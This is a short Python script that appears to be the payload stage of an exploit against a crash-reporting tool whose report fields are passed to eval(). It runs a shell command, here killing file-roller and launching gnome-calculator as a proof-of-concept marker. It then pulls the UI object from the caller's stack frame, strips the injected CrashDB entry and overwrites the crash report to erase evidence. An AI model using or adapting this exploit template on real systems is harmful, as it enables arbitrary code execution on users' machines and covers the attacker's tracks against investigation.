import subprocess
import inspect

# Run the payload
payload = "pkill -9 file-roller; gnome-calculator"
print("Running payload: %s" % payload)
subprocess.Popen(payload, shell=True)

# Clean up the crash file
# We need to get a reference to the UI object from the stack as eval()
# is called without direct access to globals.
ui = inspect.getouterframes(inspect.currentframe())[-2][0].f_locals["self"]
ui.report.pop("CrashDB", None)  # Remove CrashDB payload from the report

# Write the updated file without the CrashDB entry.
with open(ui.report_file, "wb") as f:
    ui.report.write(f)
    print("Overwrote %s with clean report" % ui.report_file)
